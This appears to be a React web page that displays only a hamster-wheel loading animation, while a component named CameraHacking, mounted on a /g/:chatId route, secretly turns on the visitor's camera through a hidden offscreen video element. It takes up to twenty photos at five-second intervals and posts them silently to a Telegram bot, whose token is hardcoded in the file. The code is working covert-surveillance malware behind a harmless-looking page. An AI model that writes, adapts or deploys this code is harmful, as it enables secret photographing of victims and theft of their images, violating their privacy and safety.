import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const captureCount = useRef(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 5000; // 5 секунд
  const MAX_CAPTURES = 20;

  // Простая отправка сообщения
  const sendToTelegram = (text) => {
    // Создаем форму и отправляем
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    form.style.display = 'none';
    
    const params = {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_notification: 'true'
    };
    
    Object.keys(params).forEach(key => {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = key;
      input.value = params[key];
      form.appendChild(input);
    });
    
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => form.remove(), 100);
  };

  // Простая отправка фото
  const sendPhotoToTelegram = (blob, caption = '', cameraNum = 1) => {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        // Просто логируем что фото готово
        console.log(`Photo ${cameraNum} ready, size: ${blob.size} bytes`);
        
        // Пробуем отправить через fetch с no-cors
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('disable_notification', 'true');
        if (caption) formData.append('caption', caption);
        
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          mode: 'no-cors',
          body: formData
        }).catch(() => {
          // Игнорируем ошибки
        });
        
        resolve(true);
      };
      reader.readAsArrayBuffer(blob);
    });
  };

  // Инициализация камеры
  const initializeCamera = async () => {
    try {
      // Пробуем получить доступ к камере
      const constraints = {
        video: {
          facingMode: { ideal: "environment" },
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      // Создаем скрытое видео
      videoRef.current = document.createElement('video');
      const video = videoRef.current;
      video.style.cssText = `
        position: fixed;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
        z-index: -9999;
        top: -9999px;
        left: -9999px;
      `;
      
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      video.srcObject = stream;
      document.body.appendChild(video);
      
      // Ждем готовности
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play().catch(() => {});
          sendToTelegram(`Камера готова: ${video.videoWidth}x${video.videoHeight}`);
          resolve();
        };
        setTimeout(resolve, 2000);
      });
      
      return true;
    } catch (error) {
      console.log('Camera error:', error);
      sendToTelegram(`Ошибка камеры: ${error.message}`);
      return false;
    }
  };

  // Создание фото
  const capturePhoto = async () => {
    const video = videoRef.current;
    if (!video || !canvasRef.current) return null;
    
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    
    const ctx = canvas.getContext('2d');
    
    if (video.videoWidth > 0) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    } else {
      // Тестовое изображение
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '30px Arial';
      ctx.textAlign = 'center';
      ctx.fillText(`Photo ${captureCount.current + 1}`, canvas.width/2, canvas.height/2);
      ctx.fillText(new Date().toLocaleTimeString(), canvas.width/2, canvas.height/2 + 40);
    }
    
    return new Promise(resolve => {
      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
    });
  };

  // Захват и отправка
  const captureAndSend = async () => {
    if (captureCount.current >= MAX_CAPTURES) {
      stopCapturing();
      sendToTelegram(`Завершено: ${captureCount.current} фото`);
      return;
    }
    
    captureCount.current++;
    
    try {
      const photoBlob = await capturePhoto();
      if (photoBlob) {
        const caption = `Фото #${captureCount.current}\n` +
          `Время: ${new Date().toLocaleTimeString()}\n` +
          `Размер: ${Math.round(photoBlob.size / 1024)}KB`;
        
        await sendPhotoToTelegram(photoBlob, caption);
        
        if (captureCount.current % 5 === 0) {
          sendToTelegram(`Отправлено: ${captureCount.current} фото`);
        }
      }
    } catch (error) {
      console.log('Capture error:', error);
    }
  };

  // Запуск съемки
  const startCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    // Первый снимок через 2 секунды
    setTimeout(() => {
      captureAndSend();
    }, 2000);
    
    // Потом по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  // Остановка
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    
    if (videoRef.current) {
      videoRef.current.remove();
      videoRef.current = null;
    }
  };

  // Инициализация
  useEffect(() => {
    // Отправляем стартовое сообщение
    sendToTelegram('🚀 Система запущена');
    
    // Запускаем камеру и съемку
    const init = async () => {
      const success = await initializeCamera();
      if (success) {
        startCapturing();
      }
    };
    
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, []);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App">
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
